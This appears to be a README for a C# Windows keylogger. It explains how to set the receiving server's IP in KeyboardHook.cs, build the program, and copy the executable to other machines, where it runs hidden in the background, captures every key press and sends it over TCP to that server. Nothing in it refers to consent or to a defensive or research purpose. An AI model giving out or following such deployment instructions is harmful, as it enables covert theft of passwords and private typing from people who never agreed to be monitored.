How to Build and Use the Project
Prerequisites:
.NET Framework: Ensure you have .NET Framework 4.x installed on your machine.
IDE: Visual Studio or any C#-compatible IDE.
Basic Knowledge: Familiarity with C# and TCP/IP networking concepts.
Step-by-Step Instructions:
Clone or Download the Project:

Download the project as a ZIP file and extract it to your desired location.
Open the Project in Visual Studio:

Launch Visual Studio.
Go to File > Open > Project/Solution.
Navigate to the project folder and select the .csproj file.
Configure the Client IP Address:

In the KeyboardHook.cs file, update the clientIp variable to the IP address of the server that will receive the key press data:
csharp
Copy code
private static string clientIp = "192.168.1.3"; // Replace with the server's IP address
Optionally, adjust the port variable if the server is listening on a different port.
Build the Project:

Go to Build > Build Solution or press Ctrl+Shift+B.
Ensure there are no build errors in the Error List window.
Run the Application:

After a successful build, you can run the application by pressing F5 or by navigating to Debug > Start Debugging.
The application will run in the background, capturing key presses and sending them to the specified server.
Deploy the Application:

Once built, you can find the executable (.exe) file in the bin\Debug or bin\Release directory within the project folder.
Copy this executable to any machine where you want to capture and send key press data.
Run the Application as a Standalone Program:

Double-click the executable file to start the program.
The program will continue running in the background, capturing key presses and sending them over TCP until it is manually stopped.
Stopping the Application:

To stop the application, use the Task Manager (Ctrl+Shift+Esc) to locate and end the process.
Alternatively, implement a custom exit mechanism (e.g., key combination or GUI) if needed.
Server Setup:
Ensure that your server is correctly configured to listen for incoming TCP connections on the specified IP address and port. The server should be capable of receiving and processing the key press data as strings.

Notes:
Security: Ensure that the transmission of key press data is secure, especially if sending sensitive information over a network.
Permissions: Running low-level hooks may require elevated permissions. Make sure to run the application as an administrator if needed.
This guide should help you set up, build, and run the project effectively.
